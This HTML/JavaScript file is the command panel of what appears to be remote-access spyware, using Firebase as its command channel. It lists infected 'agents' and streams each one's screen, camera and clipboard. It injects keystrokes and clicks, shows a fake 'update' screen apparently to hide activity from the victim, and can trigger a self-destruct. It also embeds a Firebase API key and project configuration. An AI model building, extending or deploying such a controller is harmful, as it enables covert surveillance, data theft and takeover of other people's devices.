<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Device Admin Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-auth-compat.js"></script>
    <style>
        .device-card.active { border-color: #3b82f6; background: rgba(59, 130, 246, 0.1); }
        .online { background-color: #10b981; box-shadow: 0 0 8px #10b981; }
        #main-screen { max-height: 70vh; object-fit: contain; background: #000; }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans">

    <nav class="border-b border-slate-800 bg-slate-900/80 p-4 flex justify-between items-center sticky top-0 z-50">
        <div class="flex items-center gap-3">
            <div class="bg-blue-600 p-2 rounded-lg"><i data-lucide="shield-check" class="text-white w-5 h-5"></i></div>
            <h1 class="font-bold text-lg">Command <span class="text-blue-500">Center</span></h1>
        </div>
        <div id="active-device-display" class="hidden flex items-center gap-3">
            <div class="bg-slate-800 px-4 py-1.5 rounded-full border border-slate-700 flex items-center gap-2">
                <span id="selected-device-id" class="text-xs font-mono text-blue-400">NONE</span>
                <span class="status-dot online w-2 h-2 rounded-full"></span>
            </div>
        </div>
    </nav>

    <div class="flex flex-1 overflow-hidden">
        <aside class="w-72 border-r border-slate-800 bg-slate-900/30 flex flex-col">
            <div class="p-4 border-b border-slate-800 flex justify-between items-center text-xs font-bold text-slate-500 uppercase">
                Active Agents <span id="device-count" class="bg-slate-800 px-2 py-0.5 rounded">0</span>
            </div>
            <div id="device-list" class="flex-1 overflow-y-auto p-3 space-y-2"></div>
        </aside>

        <main class="flex-1 overflow-y-auto bg-slate-950 p-6 relative">
            <div id="no-device-screen" class="absolute inset-0 flex flex-col items-center justify-center text-slate-600 bg-slate-950">
                <i data-lucide="monitor-off" class="w-16 h-16 mb-4 opacity-20"></i>
                <p>Device select karein</p>
            </div>

            <div id="dashboard-content" class="hidden grid grid-cols-1 lg:grid-cols-12 gap-6">
                <div class="lg:col-span-8 space-y-6">
                    <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-2xl">
                        <div class="p-3 border-b border-slate-800 flex justify-between items-center bg-slate-900/50">
                            <span class="text-[10px] font-bold text-blue-400 uppercase tracking-widest flex items-center gap-2">
                                <i data-lucide="mouse-pointer-2" class="w-3 h-3"></i> Live Screen
                            </span>
                        </div>
                        <img id="main-screen" class="w-full h-auto cursor-crosshair block mx-auto" />
                    </div>

                    <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 space-y-4">
                        <div class="flex gap-3">
                            <input type="text" id="kb-input" placeholder="Type message..." class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none" />
                            <button onclick="handleKeyboard()" class="bg-blue-600 px-6 rounded-xl font-bold">SEND</button>
                        </div>
                        <div class="flex flex-wrap gap-2">
                            <button onclick="sendCmd({type:'key', key:'enter'})" class="bg-slate-800 px-4 py-2 rounded-lg text-xs">ENTER</button>
                            <button onclick="sendCmd({type:'key', key:'backspace'})" class="bg-slate-800 px-4 py-2 rounded-lg text-xs">BACK</button>
                            <div class="w-[1px] bg-slate-800 mx-2"></div>
                            
                            <!-- Naya Update UI Button -->
                            <button id="update-btn" onclick="toggleUpdateScreen(true)" class="bg-orange-600/20 hover:bg-orange-600/40 text-orange-500 px-4 py-2 rounded-lg text-xs font-bold border border-orange-500/20">
                                <i data-lucide="refresh-cw" class="w-3 h-3 inline mr-1"></i> START UPDATE (HELLO)
                            </button>
                            <button id="stop-update-btn" onclick="toggleUpdateScreen(false)" class="hidden bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2 rounded-lg text-xs font-bold border border-slate-700">
                                STOP UPDATE
                            </button>

                            <button onclick="triggerDestruct()" class="ml-auto bg-red-600 px-4 py-2 rounded-lg text-xs font-bold">DESTRUCT</button>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-4 space-y-6">
                    <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden">
                        <div class="p-3 bg-slate-800/50 text-[10px] font-bold uppercase tracking-widest text-slate-400">Agent Camera</div>
                        <div class="aspect-video bg-black"><img id="cam-feed" class="w-full h-full object-cover" /></div>
                    </div>
                    <div class="bg-slate-900 rounded-2xl border border-slate-800 p-4">
                        <div class="text-[10px] font-bold uppercase text-slate-500 mb-2">Clipboard</div>
                        <div id="clip-text" class="text-xs font-mono text-blue-400 break-all bg-slate-950 p-3 rounded-lg border border-slate-800 min-h-[60px]">Waiting...</div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk",
            authDomain: "sainfoxiya-com-a7733.firebaseapp.com",
            projectId: "sainfoxiya-com-a7733",
            storageBucket: "sainfoxiya-com-a7733.firebasestorage.app",
            messagingSenderId: "639762867502",
            appId: "1:639762867502:web:826662477ce123110fc6bf"
        };

        const APP_ID = 'sainfoxiya-com-a7733';
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();

        let selectedDevice = null;
        let unsubscribeDevice = null;

        async function initDashboard() {
            await auth.signInAnonymously();
            db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices')
            .onSnapshot(snapshot => {
                const list = document.getElementById('device-list');
                document.getElementById('device-count').innerText = snapshot.size;
                list.innerHTML = '';
                snapshot.forEach(doc => {
                    const div = document.createElement('div');
                    div.className = `p-4 rounded-xl border border-slate-800 bg-slate-900/50 cursor-pointer ${selectedDevice === doc.id ? 'active' : ''}`;
                    div.onclick = () => selectDevice(doc.id);
                    div.innerHTML = `<div class="flex justify-between items-center text-xs font-bold"><span>${doc.id}</span><span class="status-dot online w-2 h-2 rounded-full"></span></div>`;
                    list.appendChild(div);
                });
            });
        }

        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            document.getElementById('selected-device-id').innerText = deviceId;
            document.getElementById('active-device-display').classList.remove('hidden');
            document.getElementById('no-device-screen').classList.add('hidden');
            document.getElementById('dashboard-content').classList.remove('hidden');
            if (unsubscribeDevice) unsubscribeDevice();
            unsubscribeDevice = db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(deviceId)
            .onSnapshot(doc => { if(doc.exists) updateUI(doc.data()); });
        }

        function updateUI(data) {
            if (data.screen) document.getElementById('main-screen').src = 'data:image/jpeg;base64,' + data.screen;
            if (data.camera) document.getElementById('cam-feed').src = 'data:image/jpeg;base64,' + data.camera;
            if (data.clipboard) document.getElementById('clip-text').innerText = data.clipboard;
            
            // Check if Update screen is active
            const isUpdating = data.command && data.command.type === 'show_html';
            document.getElementById('update-btn').style.display = isUpdating ? 'none' : 'block';
            document.getElementById('stop-update-btn').style.display = isUpdating ? 'block' : 'none';
        }

        async function sendCmd(cmd) {
            if (!selectedDevice) return;
            await db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(selectedDevice).update({
                command: { ...cmd, timestamp: Date.now() }
            });
        }

        function toggleUpdateScreen(active) {
            if (active) {
                sendCmd({ type: 'show_html' });
            } else {
                sendCmd({ type: 'hide_html' });
            }
        }

        function handleKeyboard() {
            const input = document.getElementById('kb-input');
            if (input.value) { sendCmd({ type: 'type', text: input.value }); input.value = ''; }
        }

        function triggerDestruct() {
            if (confirm("Agent delete karein?")) sendCmd({ type: 'self_destruct' });
        }

        document.getElementById('main-screen').addEventListener('click', (e) => {
            if (!selectedDevice) return;
            const rect = e.target.getBoundingClientRect();
            sendCmd({ type: 'click', x: (e.clientX - rect.left) / rect.width, y: (e.clientY - rect.top) / rect.height });
        });

        lucide.createIcons();
        initDashboard();
    </script>
</body>
</html>
